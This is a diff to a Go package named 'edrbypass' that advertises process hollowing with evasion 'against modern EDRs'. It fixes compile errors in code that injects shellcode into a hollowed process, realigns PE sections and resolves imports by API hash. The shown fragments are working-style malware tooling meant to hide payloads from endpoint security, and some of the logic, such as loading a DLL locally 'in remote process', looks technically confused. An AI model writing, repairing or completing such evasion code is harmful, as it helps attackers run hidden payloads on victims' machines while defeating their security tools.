@@ -1,3 +1,4 @@
+
 // Package edrbypass implements robust process hollowing techniques
 // Provides anti-detection evasion with high success rate against modern EDRs
 package edrbypass
@@ -5,7 +6,6 @@ package edrbypass
 import (
 	"context"
 	"fmt"
-	"unsafe"
 
 	"github.com/sirupsen/logrus"
 	"golang.org/x/sys/windows"
@@ -71,7 +71,7 @@ func NewRobustProcessHollower(shellcode []byte, logger *logrus.Logger) *RobustPr
 	
 	return &RobustProcessHollower{
 		shellcode: shellcode,
-		logger:    logger.WithField("component", "process_hollower"),
+		logger:    logger,
 	}
 }
 
@@ -139,8 +139,8 @@ func (ph *RobustProcessHollower) fixPEHeadersForX64() error {
 	
 	// Align section boundaries to 0x1000 boundary
 	for i := range ph.targetInfo.Sections {
-		ph.targetInfo.Sections[i].VirtualAddress = (ph.targetInfo.Sections[i].VirtualAddress + 0xFFF) & ^uintptr(0xFFF)
-		ph.targetInfo.Sections[i].SizeOfRawData = (ph.targetInfo.Sections[i].SizeOfRawData + 0xFFF) & ^uintptr(0xFFF)
+		ph.targetInfo.Sections[i].VirtualAddress = (ph.targetInfo.Sections[i].VirtualAddress + 0xFFF) & ^uint32(0xFFF)
+		ph.targetInfo.Sections[i].SizeOfRawData = (ph.targetInfo.Sections[i].SizeOfRawData + 0xFFF) & ^uint32(0xFFF)
 	}
 	
 	return nil
@@ -189,11 +189,15 @@ func (ph *RobustProcessHollower) fixImportTable() error {
 		ph.logger.Debugf("Resolving imports from %s", dllName)
 		
 		// Load DLL in remote process
-		hDll := windows.LoadLibraryEx(dllName, 0, 0)
+		hDll, err := windows.LoadLibraryEx(dllName, 0, 0)
+		if err != nil {
+			ph.logger.Errorf("Failed to load DLL %s: %v", dllName, err)
+			continue
+		}
 		
 		// For each API, calculate hash and find in remote process
 		for _, api := range apis {
-			addr := ph.resolveAPIHash(hDll, api.Hash)
+			addr := ph.resolveAPIHash(uintptr(hDll), api.Hash)
 			ph.targetInfo.IAT[api.Offset] = addr
 		}
 		
